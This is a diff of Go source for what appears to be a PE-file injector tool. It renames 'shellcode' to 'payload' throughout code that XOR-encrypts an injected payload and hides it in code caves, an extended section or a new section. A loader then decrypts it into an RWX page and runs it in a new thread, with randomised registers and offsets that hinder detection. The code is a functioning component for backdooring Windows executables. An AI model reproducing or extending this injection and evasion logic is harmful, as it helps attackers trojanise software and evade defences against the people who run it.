@@ -20,7 +20,7 @@ var _ embed.FS
 // xor eax, ebx            xor rax, rbx
 // mov [edi], eax          mov [rdi], rax
 // add edi, 4              add rdi, 8
-const numInstForCopyShellcode = 4
+const numInstForCopyPayload = 4
 
 const (
 	maxNumLoaderInstX86 = 350
@@ -32,9 +32,9 @@ const (
 	reservedLoaderSize = 4096
 )
 
-// The role of the shellcode loader is used to decrypt shellcode
+// The role of the payload loader is used to decrypt payload
 // in the tail section to a new RWX page, then create thread at
-// the decrypted shellcode.
+// the decrypted payload(default loader template).
 var (
 	//go:embed loader/loader_x86.asm
 	defaultLoaderX86 string
@@ -122,22 +122,22 @@ type loaderCtx struct {
 	CreateThread        uint64
 	WaitForSingleObject uint64
 
-	// information of write shellcode
-	CodeCave        bool
-	ExtendSection   bool
-	CreateSection   bool
-	JumperOffset    uint32
-	EntryOffset     int
-	MemRegionSize   int
-	ShellcodeOffset uint32
-	ShellcodeSize   int
-	ShellcodeKey    interface{}
+	// information of write payload
+	CodeCave      bool
+	ExtendSection bool
+	CreateSection bool
+	JumperOffset  uint32
+	EntryOffset   int
+	MemRegionSize int
+	PayloadOffset uint32
+	PayloadSize   int
+	PayloadKey    interface{}
 
 	// mark the end of loader
 	EndOfLoader []byte
 }
 
-func (inj *Injector) buildLoader(shellcode []byte) (output []byte, err error) {
+func (inj *Injector) buildLoader(payload []byte) (output []byte, err error) {
 	defer func() {
 		if r := recover(); r != nil {
 			err = errors.New(fmt.Sprint(r))
@@ -150,33 +150,33 @@ func (inj *Injector) buildLoader(shellcode []byte) (output []byte, err error) {
 	case "amd64":
 		src = inj.getLoaderX64()
 	}
-	asm, err := inj.buildLoaderASM(src, shellcode, false)
+	asm, err := inj.buildLoaderASM(src, payload, false)
 	if err != nil {
 		return nil, err
 	}
 	return inj.assemble(asm)
 }
 
-func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (string, error) {
-	// make sure shellcode is 4 or 8 bytes alignment
+func (inj *Injector) buildLoaderASM(src string, payload []byte, ins bool) (string, error) {
+	// make sure payload is 4 or 8 bytes alignment
 	var numPad int
 	switch inj.arch {
 	case "386":
-		numPad = len(shellcode) % 4
+		numPad = len(payload) % 4
 		if numPad != 0 {
 			numPad = 4 - numPad
 		}
 	case "amd64":
-		numPad = len(shellcode) % 8
+		numPad = len(payload) % 8
 		if numPad != 0 {
 			numPad = 8 - numPad
 		}
 	}
-	shellcode = bytes.Clone(shellcode)
-	shellcode = append(shellcode, bytes.Repeat([]byte{0x00}, numPad)...)
+	payload = bytes.Clone(payload)
+	payload = append(payload, bytes.Repeat([]byte{0x00}, numPad)...)
 	// prepare loader context for build source
 	entryOffset := 16 + inj.rand.Intn(512)
-	memRegionSize := ((entryOffset+len(shellcode))/4096 + 1 + inj.rand.Intn(16)) * 4096
+	memRegionSize := ((entryOffset+len(payload))/4096 + 1 + inj.rand.Intn(16)) * 4096
 	ctx := &loaderCtx{
 		Reg:  inj.buildRandomRegisterMap(),
 		RegV: inj.buildVolatileRegisterMap(),
@@ -185,7 +185,7 @@ func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (str
 
 		EntryOffset:   entryOffset,
 		MemRegionSize: memRegionSize,
-		ShellcodeSize: len(shellcode),
+		PayloadSize:   len(payload),
 
 		CodeCave:      inj.opts.ForceCodeCave,
 		ExtendSection: inj.opts.ForceExtendSection,
@@ -197,7 +197,7 @@ func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (str
 	if err != nil {
 		return "", err
 	}
-	err = inj.tryWriteJumper(ctx)
+	err = inj.writeShellcodeJumper(ctx)
 	if err != nil {
 		return "", err
 	}
@@ -221,12 +221,12 @@ func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (str
 	if ins {
 		switch inj.arch {
 		case "386":
-			ctx.ShellcodeKey = inj.rand.Uint32()
+			ctx.PayloadKey = inj.rand.Uint32()
 		case "amd64":
-			ctx.ShellcodeKey = inj.rand.Uint64()
+			ctx.PayloadKey = inj.rand.Uint64()
 		}
 	} else {
-		src, err = inj.buildLoaderSource(ctx, shellcode, src)
+		src, err = inj.buildLoaderSource(ctx, payload, src)
 		if err != nil {
 			return "", err
 		}
@@ -475,9 +475,9 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 	return val, key
 }
 
-// tryWriteJumper is used to try to find a code cave for store instructions about
-// a jumper to the shellcode, that the thread start address is in .text section.
-func (inj *Injector) tryWriteJumper(ctx *loaderCtx) error {
+// writeShellcodeJumper is used to try to find a code cave for store instructions
+// about a jumper to the shellcode, that the thread start address is in .text section.
+func (inj *Injector) writeShellcodeJumper(ctx *loaderCtx) error {
 	if inj.opts.NoShellcodeJumper || inj.opts.NotCreateThread || len(inj.caves) == 0 {
 		return nil
 	}
@@ -540,7 +540,7 @@ func (inj *Injector) buildLoaderSource(ctx *loaderCtx, sc []byte, src string) (s
 		}
 	}
 	if counter > 1 {
-		return "", errors.New("invalid force mode with shellcode source")
+		return "", errors.New("invalid force mode with payload source")
 	}
 	var maxLoaderSize int
 	switch inj.arch {
@@ -565,10 +565,10 @@ func (inj *Injector) buildLoaderSource(ctx *loaderCtx, sc []byte, src string) (s
 	var numCaves int
 	switch inj.arch {
 	case "386":
-		numCaves = (len(sc)/4 + 1) * numInstForCopyShellcode
+		numCaves = (len(sc)/4 + 1) * numInstForCopyPayload
 		numCaves += maxNumLoaderInstX86
 	case "amd64":
-		numCaves = (len(sc)/8 + 1) * numInstForCopyShellcode
+		numCaves = (len(sc)/8 + 1) * numInstForCopyPayload
 		numCaves += maxNumLoaderInstX64
 	}
 	if numCaves < len(inj.caves) {
@@ -587,7 +587,7 @@ func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) stri
 	switch inj.arch {
 	case "386":
 		key := inj.rand.Uint32()
-		ctx.ShellcodeKey = key
+		ctx.PayloadKey = key
 		for i := 0; i < len(sc); i += 4 {
 			reg := regVolatileX86[inj.rand.Intn(len(regVolatileX86))]
 			val := binary.LittleEndian.Uint32(sc[i:])
@@ -600,7 +600,7 @@ func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) stri
 		}
 	case "amd64":
 		key := inj.rand.Uint64()
-		ctx.ShellcodeKey = key
+		ctx.PayloadKey = key
 		for i := 0; i < len(sc); i += 8 {
 			reg := regVolatileX64[inj.rand.Intn(len(regVolatileX64))]
 			val := binary.LittleEndian.Uint64(sc[i:])
@@ -619,43 +619,43 @@ func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) stri
 }
 
 func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string) string {
-	shellcode := inj.encryptShellcode(ctx, sc)
-	offset := inj.extendSection(shellcode)
+	payload := inj.encryptPayload(ctx, sc)
+	offset := inj.extendSection(payload)
 	ctx.ExtendSection = true
-	ctx.ShellcodeOffset = offset
+	ctx.PayloadOffset = offset
 	inj.ctx.Mode = ModeExtendSection
 	// remove the flag in assembly source
 	return strings.ReplaceAll(src, codeCaveModeStub, "")
 }
 
 func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
-	shellcode := inj.encryptShellcode(ctx, sc)
+	payload := inj.encryptPayload(ctx, sc)
 	randomOffset := uint32(inj.rand.Intn(2048)) // #nosec G115
 	scOffset := reservedLoaderSize + randomOffset
-	size := scOffset + uint32(len(shellcode)) // #nosec G115
+	size := scOffset + uint32(len(payload)) // #nosec G115
 	section, err := inj.createSection(inj.opts.SectionName, size)
 	if err != nil {
 		return "", err
 	}
 	inj.section = section
-	// write random data for padding caves between loader and shellcode
+	// write random data for padding caves between loader and payload
 	_, _ = inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+scOffset])
-	// write encrypted shellcode
-	copy(inj.dup[section.Offset+scOffset:], shellcode)
+	// write encrypted payload
+	copy(inj.dup[section.Offset+scOffset:], payload)
 	ctx.CreateSection = true
-	ctx.ShellcodeOffset = section.VirtualAddress + scOffset
+	ctx.PayloadOffset = section.VirtualAddress + scOffset
 	inj.ctx.Mode = ModeCreateSection
 	// remove the flag in assembly source
 	return strings.ReplaceAll(src, codeCaveModeStub, ""), nil
 }
 
-func (inj *Injector) encryptShellcode(ctx *loaderCtx, sc []byte) []byte {
-	// encrypt shellcode
+func (inj *Injector) encryptPayload(ctx *loaderCtx, sc []byte) []byte {
+	// encrypt payload
 	encrypted := make([]byte, len(sc))
 	switch inj.arch {
 	case "386":
 		key := inj.rand.Uint32()
-		ctx.ShellcodeKey = key
+		ctx.PayloadKey = key
 		for i := 0; i < len(sc); i += 4 {
 			val := binary.LittleEndian.Uint32(sc[i:])
 			binary.LittleEndian.PutUint32(encrypted[i:], val^key)
@@ -663,7 +663,7 @@ func (inj *Injector) encryptShellcode(ctx *loaderCtx, sc []byte) []byte {
 		}
 	case "amd64":
 		key := inj.rand.Uint64()
-		ctx.ShellcodeKey = key
+		ctx.PayloadKey = key
 		for i := 0; i < len(sc); i += 8 {
 			val := binary.LittleEndian.Uint64(sc[i:])
 			binary.LittleEndian.PutUint64(encrypted[i:], val^key)
